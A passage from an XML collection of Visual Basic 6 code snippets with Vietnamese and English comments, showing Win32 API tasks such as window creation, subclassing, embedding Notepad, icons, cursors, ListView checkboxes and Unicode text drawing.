    wParam As Long
    lParam As Long
    time As Long
    pt As POINTAPI
End Type

' Class styles
Public Const CS_VREDRAW = &amp;H1
Public Const CS_HREDRAW = &amp;H2
Public Const CS_KEYCVTWINDOW = &amp;H4
Public Const CS_DBLCLKS = &amp;H8
Public Const CS_OWNDC = &amp;H20
Public Const CS_CLASSDC = &amp;H40
Public Const CS_PARENTDC = &amp;H80
Public Const CS_NOKEYCVT = &amp;H100
Public Const CS_NOCLOSE = &amp;H200
Public Const CS_SAVEBITS = &amp;H800
Public Const CS_BYTEALIGNCLIENT = &amp;H1000
Public Const CS_BYTEALIGNWINDOW = &amp;H2000
Public Const CS_PUBLICCLASS = &amp;H4000
' Window styles
Public Const WS_OVERLAPPED = &amp;H0&amp;
Public Const WS_POPUP = &amp;H80000000
Public Const WS_CHILD = &amp;H40000000
Public Const WS_MINIMIZE = &amp;H20000000
Public Const WS_VISIBLE = &amp;H10000000
Public Const WS_DISABLED = &amp;H8000000
Public Const WS_CLIPSIBLINGS = &amp;H4000000
Public Const WS_CLIPCHILDREN = &amp;H2000000
Public Const WS_MAXIMIZE = &amp;H1000000
Public Const WS_CAPTION = &amp;HC00000                  '  WS_BORDER Or WS_DLGFRAME
Public Const WS_BORDER = &amp;H800000
Public Const WS_DLGFRAME = &amp;H400000
Public Const WS_VSCROLL = &amp;H200000
Public Const WS_HSCROLL = &amp;H100000
Public Const WS_SYSMENU = &amp;H80000
Public Const WS_THICKFRAME = &amp;H40000
Public Const WS_GROUP = &amp;H20000
Public Const WS_TABSTOP = &amp;H10000
Public Const WS_MINIMIZEBOX = &amp;H20000
Public Const WS_MAXIMIZEBOX = &amp;H10000
Public Const WS_TILED = WS_OVERLAPPED
Public Const WS_ICONIC = WS_MINIMIZE
Public Const WS_SIZEBOX = WS_THICKFRAME
Public Const WS_OVERLAPPEDWINDOW = (WS_OVERLAPPED Or WS_CAPTION Or WS_SYSMENU Or WS_THICKFRAME Or WS_MINIMIZEBOX Or WS_MAXIMIZEBOX)
Public Const WS_TILEDWINDOW = WS_OVERLAPPEDWINDOW
Public Const WS_POPUPWINDOW = (WS_POPUP Or WS_BORDER Or WS_SYSMENU)
Public Const WS_CHILDWINDOW = (WS_CHILD)
' ExWindowStyles
Public Const WS_EX_DLGMODALFRAME = &amp;H1&amp;
Public Const WS_EX_NOPARENTNOTIFY = &amp;H4&amp;
Public Const WS_EX_TOPMOST = &amp;H8&amp;
Public Const WS_EX_ACCEPTFILES = &amp;H10&amp;
Public Const WS_EX_TRANSPARENT = &amp;H20&amp;
' Color constants
Public Const COLOR_SCROLLBAR = 0
Public Const COLOR_BACKGROUND = 1
Public Const COLOR_ACTIVECAPTION = 2
Public Const COLOR_INACTIVECAPTION = 3
Public Const COLOR_MENU = 4
Public Const COLOR_WINDOW = 5
Public Const COLOR_WINDOWFRAME = 6
Public Const COLOR_MENUTEXT = 7
Public Const COLOR_WINDOWTEXT = 8
Public Const COLOR_CAPTIONTEXT = 9
Public Const COLOR_ACTIVEBORDER = 10
Public Const COLOR_INACTIVEBORDER = 11
Public Const COLOR_APPWORKSPACE = 12
Public Const COLOR_HIGHLIGHT = 13
Public Const COLOR_HIGHLIGHTTEXT = 14
Public Const COLOR_BTNFACE = 15
Public Const COLOR_BTNSHADOW = 16
Public Const COLOR_GRAYTEXT = 17
Public Const COLOR_BTNTEXT = 18
Public Const COLOR_INACTIVECAPTIONTEXT = 19
Public Const COLOR_BTNHIGHLIGHT = 20
' Window messages
Public Const WM_NULL = &amp;H0
Public Const WM_CREATE = &amp;H1
Public Const WM_DESTROY = &amp;H2
Public Const WM_MOVE = &amp;H3
Public Const WM_SIZE = &amp;H5
' ShowWindow commands
Public Const SW_HIDE = 0
Public Const SW_SHOWNORMAL = 1
Public Const SW_NORMAL = 1
Public Const SW_SHOWMINIMIZED = 2
Public Const SW_SHOWMAXIMIZED = 3
Public Const SW_MAXIMIZE = 3
Public Const SW_SHOWNOACTIVATE = 4
Public Const SW_SHOW = 5
Public Const SW_MINIMIZE = 6
Public Const SW_SHOWMINNOACTIVE = 7
Public Const SW_SHOWNA = 8
Public Const SW_RESTORE = 9
Public Const SW_SHOWDEFAULT = 10
Public Const SW_MAX = 10
' Standard ID's of cursors
Public Const IDC_ARROW = 32512&amp;
Public Const IDC_IBEAM = 32513&amp;
Public Const IDC_WAIT = 32514&amp;
Public Const IDC_CROSS = 32515&amp;
Public Const IDC_UPARROW = 32516&amp;
Public Const IDC_SIZE = 32640&amp;
Public Const IDC_ICON = 32641&amp;
Public Const IDC_SIZENWSE = 32642&amp;
Public Const IDC_SIZENESW = 32643&amp;
Public Const IDC_SIZEWE = 32644&amp;
Public Const IDC_SIZENS = 32645&amp;
Public Const IDC_SIZEALL = 32646&amp;
Public Const IDC_NO = 32648&amp;
Public Const IDC_APPSTARTING = 32650&amp;
Public Const GWL_WNDPROC = -4

Dim hwnd2 As Long, hwnd3 As Long, old_proc As Long, new_proc As Long
Public Sub Main()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim lngTemp As Long
    ' Register class
    If MyRegisterClass Then
        ' Window created?
        If MyCreateWindow Then
        ' Change the button's procedures
        ' Point to new address
            new_proc = GetMyWndProc(AddressOf ButtonProc)
            old_proc = SetWindowLong(hwnd2, GWL_WNDPROC, new_proc)
            ' Message loop
            MyMessageLoop
        End If
        ' Unregister Class
        MyUnregisterClass
    End If
End Sub
Private Function MyRegisterClass() As Boolean
    ' WNDCLASS-structure
    Dim wndcls As WNDCLASSEX
    'Thiet lap kich thuoc cua cau truc
    wndcls.cbSize = Len(wndcls)
    'Kiểu lớp: đưa cho mỗi cửa sổ DC của nó + vẽ lại cửa sổ khi thay đổi kích thước
    wndcls.style = CS_OWNDC Or CS_HREDRAW Or CS_VREDRAW
    'Dung thu tuc MyWndProc de xu ly thong diep
    wndcls.lpfnWndProc = GetMyWndProc(AddressOf MyWndProc)
    'Khong dung thong tin phu
    wndcls.cbClsExtra = 0
    wndcls.cbWndExtra = 0
    'Handle tro den instance cua ung dung nay
    wndcls.hInstance = App.hInstance
    'Dung icon chua trong c:\my_icon.ico
    wndcls.hIcon = ExtractIcon(App.hInstance, "c:\my_icon.ico", 0)
    'Dung icon nho chua trong c:\my_iconSm.ico
    wndcls.hIconSm = ExtractIcon(App.hInstance, "c:\my_iconSm.ico", 0)
    'Dung cursor chua trong C:\WINDOWS\Cursors\harrow.cur
    wndcls.hCursor = LoadCursorFromFile("C:\WINDOWS\Cursors\harrow.cur")
    'To mau nen
    wndcls.hbrBackground = COLOR_BACKGROUND
    'Khong dung tai nguyen menu
    wndcls.lpszMenuName = "
    'Dat ten lop
    wndcls.lpszClassName = "myWindowClass"
    'Dang ky lop
    MyRegisterClass = (RegisterClassEx(wndcls) &lt;&gt; 0)
End Function
Private Sub MyUnregisterClass()
    UnregisterClass "myWindowClass", App.hInstance
End Sub
Private Function MyCreateWindow() As Boolean
    Dim hWnd As Long
    ' Create the window
    hWnd = CreateWindowEx(0, "myWindowClass", "My Window", WS_OVERLAPPEDWINDOW, 0, 0, 400, 300, 0, 0, App.hInstance, ByVal 0&amp;)
    ' The Button and Textbox are child windows
    hwnd2 = CreateWindowEx(0, "Button", "My button", WS_CHILD, 50, 55, 100, 25, hWnd, 0, App.hInstance, ByVal 0&amp;)
    hwnd3 = CreateWindowEx(0, "edit", "My textbox", WS_CHILD, 50, 25, 100, 25, hWnd, 0, App.hInstance, ByVal 0&amp;)
    If hWnd &lt;&gt; 0 Then ShowWindow hWnd, SW_SHOWNORMAL
    ' Show them
    ShowWindow hwnd2, SW_SHOWNORMAL
    ShowWindow hwnd3, SW_SHOWNORMAL
    ' Go back
    MyCreateWindow = (hWnd &lt;&gt; 0)
End Function
Private Function MyWndProc(ByVal hWnd As Long, ByVal message As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
    Select Case message
        Case WM_DESTROY
            ' Destroy window
            PostQuitMessage (0)
    End Select
    ' calls the default window procedure
    MyWndProc = DefWindowProc(hWnd, message, wParam, lParam)
End Function
Function GetMyWndProc(ByVal lWndProc As Long) As Long
    GetMyWndProc = lWndProc
End Function
Private Sub MyMessageLoop()
    Dim aMsg As Msg
    Do While GetMessage(aMsg, 0, 0, 0)
        DispatchMessage aMsg
    Loop
End Sub
Private Function ButtonProc(ByVal hWnd As Long, ByVal message As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
    Dim x As Integer
    If (message = 533) Then
        x = MsgBox("You clicked on the button", vbOKOnly)
    End If
    ' calls the window procedure
    ButtonProc = CallWindowProc(old_proc, hWnd, message, wParam, lParam)
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607101308510518</MaVD>
    <NoiDung>'Chương trình cần 1 form (Form1), 1 MDIForm (tên MDIForm1).
'Thay đổi thuộc tính MDIChild của Form1 để kiểm tra đọan code sau:
Private Declare Function IsChild Lib "user32" (ByVal hWndParent As Long, ByVal hwnd As Long) As Long
Private Sub Form_Load()
    'Is this form a child?
    If IsChild(MDIForm1.hwnd, Me.hwnd) = 1 Then
        MsgBox "This form is a child", vbInformation + vbOKOnly, App.Title
    Else
        MsgBox "This form is not a child", vbInformation + vbOKOnly, App.Title
    End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607101426302534</MaVD>
    <NoiDung>Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As Long, ByVal lpWindowName As Long) As Long
Private Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function SetParent Lib "user32" (ByVal hWndChild As Long, ByVal hWndNewParent As Long) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Private Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Private Declare Function LockWindowUpdate Lib "user32" (ByVal hwndLock As Long) As Long
Private Declare Function GetDesktopWindow Lib "user32" () As Long
Private Declare Function DestroyWindow Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
Private Declare Function Putfocus Lib "user32" Alias "SetFocus" (ByVal hwnd As Long) As Long
Const GW_HWNDNEXT = 2
Dim mWnd As Long
Function InstanceToWnd(ByVal target_pid As Long) As Long
    Dim test_hwnd As Long, test_pid As Long, test_thread_id As Long
    'Find the first window
    test_hwnd = FindWindow(ByVal 0&amp;, ByVal 0&amp;)
    Do While test_hwnd &lt;&gt; 0
        'Check if the window isn't a child
        If GetParent(test_hwnd) = 0 Then
            'Get the window's thread
            test_thread_id = GetWindowThreadProcessId(test_hwnd, test_pid)
            If test_pid = target_pid Then
                InstanceToWnd = test_hwnd
                Exit Do
            End If
        End If
        'retrieve the next window
        test_hwnd = GetWindow(test_hwnd, GW_HWNDNEXT)
    Loop
End Function
Private Sub Form_Load()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim Pid As Long
    'Lock the window update
    LockWindowUpdate GetDesktopWindow
    'Execute notepad.Exe
    Pid = Shell("c:\windows\notepad.exe", vbNormalFocus)
    If Pid = 0 Then MsgBox "Error starting the app"
    'retrieve the handle of the window
    mWnd = InstanceToWnd(Pid)
    'Set the notepad's parent
    SetParent mWnd, Me.hwnd
    'Put the focus on notepad
    Putfocus mWnd
    'Unlock windowupdate
    LockWindowUpdate False
End Sub
Private Sub Form_Unload(Cancel As Integer)
    'Unload notepad
    DestroyWindow mWnd
    'End this program
    TerminateProcess GetCurrentProcess, 0
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607101505231028</MaVD>
    <NoiDung>Private Declare Function GetClassLong Lib "user32.dll" Alias "GetClassLongA" (ByVal hWnd As Long, ByVal nIndex As Long) As Long
Private Declare Function ExtractIcon Lib "shell32.dll" Alias "ExtractIconA" (ByVal hInst As Long, ByVal lpszExeFileName As String, ByVal nIconIndex As Long) As Long
Private Declare Function DrawIcon Lib "user32.dll" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, ByVal hIcon As Long) As Long
Private Declare Function SetClassLong Lib "user32.dll" Alias "SetClassLongA" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Const GCL_HICON As Long = -14

Private Sub Command1_Click()
    Dim hIcon As Long, retval As Long
    'Dùng icon chứa trong c:\my_icon.ico
    hIcon = ExtractIcon(App.hInstance, "c:\my_icon.ico", 0)
    'Đặt icon cho lớp form
    retval = SetClassLong(Me.hWnd, GCL_HICON, hIcon)
    'Lấy ra icon từ lớp form
    hIcon = GetClassLong(Me.hWnd, GCL_HICON)
    'Vẽ icon ra form
    retval = DrawIcon(Me.hdc, 0, 0, hIcon)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607101527031048</MaVD>
    <NoiDung>'This project needs a TextBox
Private Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long) As Long
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Const GWL_STYLE = (-16)
Const ES_NUMBER = &amp;H2000&amp;

Public Sub SetNumber(NumberText As TextBox, Flag As Boolean)
    Dim curstyle As Long, newstyle As Long

    'retrieve the window style
    curstyle = GetWindowLong(NumberText.hwnd, GWL_STYLE)

    If Flag Then
       curstyle = curstyle Or ES_NUMBER
    Else
       curstyle = curstyle And (Not ES_NUMBER)
    End If

    'Set the new style
    newstyle = SetWindowLong(NumberText.hwnd, GWL_STYLE, curstyle)
    'refresh
    NumberText.Refresh
End Sub
Private Sub Form_Load()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net

    SetNumber Text1, True
    Me.Caption = "Now, try typing some letters into the textbox"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607101608131604</MaVD>
    <NoiDung>Const SWP_HIDEWINDOW = &amp;H80
Const SWP_SHOWWINDOW = &amp;H40
Const GW_CHILD = 5
Const GW_HWNDNEXT = 2
Private Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, ByVal y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Dim tWnd As Long, bWnd As Long, sSave As String * 250
Private Sub Form_Load()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net

    'This code will hide the Start-button
    'Find the taskbar's handle
    tWnd = FindWindow("Shell_traywnd", vbNullString)
    'Search for a child window
    bWnd = GetWindow(tWnd, GW_CHILD)
    Do
        'get the child window's classname
        GetClassName bWnd, sSave, 250
        'We have the handle of the Start button If the classname is 'button'
        If LCase(Left$(sSave, 6)) = "button" Then Exit Do
        'Search the next child
        bWnd = GetWindow(bWnd, GW_HWNDNEXT)
    Loop
    'Hide the start button
    SetWindowPos bWnd, 0, 0, 0, 0, 0, SWP_HIDEWINDOW
End Sub
Private Sub Form_Unload(Cancel As Integer)
    'Show the start button
    SetWindowPos bWnd, 0, 0, 0, 0, 0, SWP_SHOWWINDOW
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607222103373243</MaVD>
    <NoiDung>Option Explicit

Private Declare Function PlgBlt Lib "gdi32" (ByVal hdcDest As Long, _
                                    lpPoint As POINTAPI, _
                                    ByVal hdcSrc As Long, _
                                    ByVal nXSrc As Long, _
                                    ByVal nYSrc As Long, _
                                    ByVal nWidth As Long, _
                                    ByVal nHeight As Long, _
                                    ByVal hbmMask As Long, _
                                    ByVal xMask As Long, _
                                    ByVal yMask As Long) As Long

 Const NotPI = 3.14159265238 / 180
'-------------------------------------------------------------------------------
Private Type POINTAPI
   x As Long
   y As Long
End Type

Private Sub DanRotate(ByRef picDestHdc As Long, xPos As Long, yPos As Long, _
                       ByVal Angle As Long, _
                       ByRef picSrcHdc As Long, srcXoffset As Long, srcYoffset As Long, _
                       ByVal srcWidth As Long, ByVal srcHeight As Long)

'## DanRotate - Rotates an image.
'##
'## PicDestHdc      = the hDc of the target picturebox (ie. Picture2.hdc )
'## xPos            = the target coordinates (note that the image will be centered around these
'## yPos              coordinates).
'## Angle           = Rotate Angle (0-360)
'## PicSrcHdc       = The source image to rotate (ie. Picture1.hdc )
'## srcXoffset      = The offset coordinates within the Source Image to grab.
'## srcYoffset
'## srcWidth        = The width/height of the source image to grab.
'## srcHeight
'##
'## Returns: Nothing.

'## Please note this function doesn't check or returns anything. It's up to you to make sure all parameters
'## are valid, checked, etc.
'##
'## Use this code as you like. Credits appreciated.
'##
'## Danny van der Ark (danny@slave-studios.co.uk)
'## Aug 2Oo2

Dim Points(3) As POINTAPI
Dim DefPoints(3) As POINTAPI
Dim ThetS As Single, ThetC As Single
Dim ret As Long
    'SET LOCAL AXIS / ALIGNMENT
    Points(0).x = -srcWidth * 0.5
    Points(0).y = -srcHeight * 0.5
    
    Points(1).x = Points(0).x + srcWidth
    Points(1).y = Points(0).y
    
    Points(2).x = Points(0).x
    Points(2).y = Points(0).y + srcHeight
    'ROTATE AROUND Z-AXIS
    ThetS = Sin(Angle * NotPI)
    ThetC = Cos(Angle * NotPI)
    DefPoints(0).x = (Points(0).x * ThetC - Points(0).y * ThetS) + xPos
    DefPoints(0).y = (Points(0).x * ThetS + Points(0).y * ThetC) + yPos
    
    DefPoints(1).x = (Points(1).x * ThetC - Points(1).y * ThetS) + xPos
    DefPoints(1).y = (Points(1).x * ThetS + Points(1).y * ThetC) + yPos
    
    DefPoints(2).x = (Points(2).x * ThetC - Points(2).y * ThetS) + xPos
    DefPoints(2).y = (Points(2).x * ThetS + Points(2).y * ThetC) + yPos
    
    PlgBlt picDestHdc, DefPoints(0), picSrcHdc, srcXoffset, srcYoffset, srcWidth, srcHeight, 0, 0, 0

End Sub

Private Sub Command1_Click()
Dim tel As Integer
    For tel = 0 To 360 Step 1
        picBck.Cls
        DanRotate picBck.hDC, 128, 128, tel, picCol.hDC, 0, 0, 128, 128
        picBck.Refresh
        DoEvents
    Next tel
    
End Sub

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607222107380638</MaVD>
    <NoiDung>Option Explicit

Private Declare Function LoadCursor Lib "user32.dll" Alias "LoadCursorA" (ByVal hInstance As Long, ByVal lpCursorName As Long) As Long
Private Declare Function SetCursor Lib "user32.dll" (ByVal hCursor As Long) As Long

Const IDC_HAND As Long = 32649      'Ban tay
Const IDC_WAIT As Long = 32514&amp;     'dong ho

Private Sub Command1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    SetCursor LoadCursor(ByVal 0&amp;, IDC_WAIT)
End Sub

Private Sub Command1_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    SetCursor LoadCursor(ByVal 0&amp;, IDC_HAND)
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607222136280470</MaVD>
    <NoiDung>Option Explicit

Dim WithEvents My_button As CommandButton

Private Sub Command1_Click()
    Set My_button = Form1.Controls.Add("VB.CommandButton", "MyButton1")
    My_button.Visible = True
    My_button.Caption = My_button.Name
End Sub

Private Sub Command2_Click()
    Form1.Controls.Remove My_button
    Set My_button = Nothing
End Sub

Private Sub My_button_Click()
    MsgBox "Have I been born ?" &amp; vbCrLf &amp; "my name is " &amp; My_button.Name
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607222159071961</MaVD>
    <NoiDung>Option Explicit
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Const MAX_PATH = 260
Private Const LVM_FIRST As Long = &amp;H1000
Private Const LVM_SETEXTENDEDLISTVIEWSTYLE As Long = (LVM_FIRST + 54)
Private Const LVM_GETEXTENDEDLISTVIEWSTYLE As Long = (LVM_FIRST + 55)
Private Const LVS_EX_FULLROWSELECT As Long = &amp;H20
Private Const LVS_EX_GRIDLINES As Long = &amp;H1
Private Const LVS_EX_CHECKBOXES As Long = &amp;H4
Private Const LVM_GETITEMSTATE As Long = (LVM_FIRST + 44)
Private Const LVM_GETITEMTEXT As Long = (LVM_FIRST + 45)
Private Const LVM_SETITEMSTATE = (LVM_FIRST + 43)
Private Const LVIS_STATEIMAGEMASK = &amp;HF000
Private Const LVIS_CHECKED = &amp;H2000&amp;
Private Const LVIS_UNCHECKED = &amp;H1000&amp;

Private Type LV_ITEM
    mask As Long
    iItem As Long
    iSubItem As Long
    state As Long
    stateMask As Long
    pszText As String
    cchTextMax As Long
    iImage As Long
    lParam As Long
    iIndent As Long
End Type

Private Sub Let_Checked(hWnd, ByVal Item As Long, ByVal bChecked As Boolean)
    'Apply all when item=0
    Dim LVI As LV_ITEM
    LVI.stateMask = LVIS_STATEIMAGEMASK '8192
    If bChecked Then LVI.state = LVIS_CHECKED Else LVI.state = LVIS_UNCHECKED
    SendMessage hWnd, LVM_SETITEMSTATE, Item - 1, LVI

End Sub

Private Function Get_Checked(hWnd As Long, ByVal Item As Long) As Boolean

    Dim lRet As Long
    lRet = SendMessage(hWnd, LVM_GETITEMSTATE, Item - 1, ByVal LVIS_STATEIMAGEMASK)
    Get_Checked = (lRet = LVIS_CHECKED)

End Function

Private Sub Command1_Click()
Dim ret As Long, i As Integer
    ret = SendMessage(ListView1.hWnd, LVM_SETEXTENDEDLISTVIEWSTYLE, LVS_EX_CHECKBOXES, True)
    For i = 1 To 10
        ListView1.ListItems.Add , , "item " &amp; i
    Next
End Sub

Private Sub Command2_Click()
    Let_Checked ListView1.hWnd, 0, True
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607222349470049</MaVD>
    <NoiDung>Private Sub Form_Load()
    MsgBox Time
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607230019130699</MaVD>
    <NoiDung>Const DT_CENTER = &amp;H1
Private Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type
Private Declare Function DrawText Lib "user32" Alias "DrawTextW" (ByVal hdc As Long, ByVal lpStr As Long, ByVal nCount As Long, lpRect As RECT, ByVal wFormat As Long) As Long
Private Sub Form_Paint()
    Dim R As RECT
    'Clear the form
    Me.Cls
    'API uses pixels
    Me.ScaleMode = vbPixels
    R.Left = 0
    R.Top = 0
    R.Right = Me.ScaleWidth
    R.Bottom = Me.ScaleHeight
    'draw some text on our form
    Me.FontName = "Tahoma"
    DrawText Me.hdc, StrPtr("Ti" &amp; ChrW$(&amp;H1EBF) &amp; "ng Vi" &amp; ChrW$(&amp;H1EC7) &amp; "t Unicode"), -1, R, DT_CENTER
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607230117370340</MaVD>
    <NoiDung>Private Sub Form_Load()
    Dim MyString
    MyString = "ABC"
    MsgBox Len(MyString)
    ' Returns 3 - 3 characters in the string.
    MsgBox LenB(MyString)
    ' Returns 6 - 6 bytes used for Unicode.
    MsgBox LenB("AB" &amp; StrConv("C", vbFormUnicode))
    ' Returns 5 - 4 bytes used for Unicode and 1 byte used for ANSI.
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607230359140347</MaVD>
    <NoiDung>Public Function IsUnicode(s As String) As Boolean
   Dim i As Long
   Dim bLen As Long
   Dim Map() As Byte

   If LenB(s) Then
      Map = s
      bLen = UBound(Map)
      For i = 1 To bLen Step 2
         If (Map(i) &gt; 0) Then
            IsUnicode = True
            Exit Function
         End If
      Next
   End If
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607230608473753</MaVD>
    <NoiDung>Option Explicit

Private Const SC_CLOSE As Long = &amp;HF060&amp;
Private Const MIIM_STATE     As Long = &amp;H1&amp;
Private Const MIIM_ID  As Long = &amp;H2&amp;
Private Const MFS_GRAYED     As Long = &amp;H3&amp;
Private Const MFS_CHECKED    As Long = &amp;H8&amp;
Private Const WM_NCACTIVATE  As Long = &amp;H86
Private Type MENUITEMINFO
    cbSize  As Long
    fMask   As Long
    fType   As Long
    fState  As Long
    wID     As Long
    hSubMenu As Long
    hbmpChecked   As Long
    hbmpUnchecked As Long
    dwItemData    As Long
    dwTypeData    As String
    cch     As Long
End Type

'Declarations.
Private Declare Function GetSystemMenu Lib "user32" ( _
    ByVal hwnd As Long, ByVal bRevert As Long) As Long
Private Declare Function GetMenuItemInfo Lib "user32" Alias _
    "GetMenuItemInfoA" (ByVal hMenu As Long, ByVal un As Long, _
    ByVal b As Boolean, lpMenuItemInfo As MENUITEMINFO) As Long
Private Declare Function SetMenuItemInfo Lib "user32" Alias _
    "SetMenuItemInfoA" (ByVal hMenu As Long, ByVal un As Long, _
    ByVal bool As Boolean, lpcMenuItemInfo As MENUITEMINFO) As Long
Private Declare Function SendMessage Lib "user32" Alias _
    "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, _
    ByVal wParam As Long, lParam As Any) As Long
'Application-specific constants and variables.
Private Const xSC_CLOSE  As Long = -10
Private Const SwapID     As Long = 1
Private Const ResetID    As Long = 2

Private hMenu  As Long
Private MII    As MENUITEMINFO

Private Sub Command1_Click()
    Dim Ret As Long

    Ret = SetId(SwapID)
    If Ret &lt;&gt; 0 Then
        If MII.fState = (MII.fState Or MFS_GRAYED) Then
            MII.fState = MII.fState - MFS_GRAYED
        Else
            MII.fState = (MII.fState Or MFS_GRAYED)
        End If

        MII.fMask = MIIM_STATE
        Ret = SetMenuItemInfo(hMenu, MII.wID, False, MII)
        If Ret = 0 Then
            Ret = SetId(ResetID)
        End If

        Ret = SendMessage(Me.hwnd, WM_NCACTIVATE, True, 0)
        SetButtons
    End If
End Sub

Private Sub Command2_Click()
    Dim Ret As Long

    If MII.fState = (MII.fState Or MFS_CHECKED) Then
        MII.fState = MII.fState - MFS_CHECKED
    Else
        MII.fState = (MII.fState Or MFS_CHECKED)
    End If

    MII.fMask = MIIM_STATE
    Ret = SetMenuItemInfo(hMenu, MII.wID, False, MII)
    SetButtons
End Sub

Private Sub Command3_Click()
    Unload Me
End Sub

Private Function SetId(Action As Long) As Long
    Dim MenuID As Long
    Dim Ret As Long

    MenuID = MII.wID
    If MII.fState = (MII.fState Or MFS_GRAYED) Then
        If Action = SwapID Then
            MII.wID = SC_CLOSE
        Else
            MII.wID = xSC_CLOSE
        End If
    Else
        If Action = SwapID Then
            MII.wID = xSC_CLOSE
        Else
            MII.wID = SC_CLOSE
        End If
    End If

    MII.fMask = MIIM_ID
    Ret = SetMenuItemInfo(hMenu, MenuID, False, MII)
    If Ret = 0 Then
        MII.wID = MenuID
    End If
    SetId = Ret
End Function

Private Sub SetButtons()
    If MII.fState = (MII.fState Or MFS_GRAYED) Then
        Command1.Caption = "Enable"
    Else
        Command1.Caption = "Disable"
    End If
    If MII.fState = (MII.fState Or MFS_CHECKED) Then
        Command2.Caption = "Uncheck"
    Else
        Command2.Caption = "Check"
    End If
End Sub

Private Sub Form_Load()
    Dim Ret As Long
    hMenu = GetSystemMenu(Me.hwnd, 0)
    MII.cbSize = Len(MII)
    MII.dwTypeData = String(80, 0)
    MII.cch = Len(MII.dwTypeData)
    MII.fMask = MIIM_STATE
    MII.wID = SC_CLOSE
    Ret = GetMenuItemInfo(hMenu, MII.wID, False, MII)
    SetButtons
    Command3.Caption = "Exit"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0607230628372549</MaVD>
    <NoiDung>'add vào form
Option Explicit

' This constant is used to refer to the Message Handling function in a given window
Private Const GWL_WNDPROC = (-4)
Private Sub Form_Load()
    ' First, we need to store the address of the existing Message Handler
    OldWindowProc = GetWindowLong(Me.hwnd, GWL_WNDPROC)
    ' Now we can tell windows to forward all messages to out own Message Handler
    Call SetWindowLong(Me.hwnd, GWL_WNDPROC, AddressOf SubClass1_WndMessage)
End Sub
Private Sub Form_Unload(Cancel As Integer)
    ' We must return control of the messages back to windows before the program exits
    Call SetWindowLong(Me.hwnd, GWL_WNDPROC, OldWindowProc)
End Sub

'-----------------------------
'add vào Module
Option Explicit

Public Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long) As Long
Public Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (pDest As Any, pSource As Any, ByVal ByteLen As Long)
Public Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Public Const WM_GETMINMAXINFO = &amp;H24

Type POINTAPI
     x As Long
     y As Long
End Type

Type MINMAXINFO
        ptReserved As POINTAPI
        ptMaxSize As POINTAPI
        ptMaxPosition As POINTAPI
        ptMinTrackSize As POINTAPI
        ptMaxTrackSize As POINTAPI
End Type
Public OldWindowProc As Long  ' Original window proc

Public Function SubClass1_WndMessage(ByVal hwnd As Long, ByVal Msg As Long, ByVal wp As Long, ByVal lp As Long) As Long
    
    If Msg = WM_GETMINMAXINFO Then
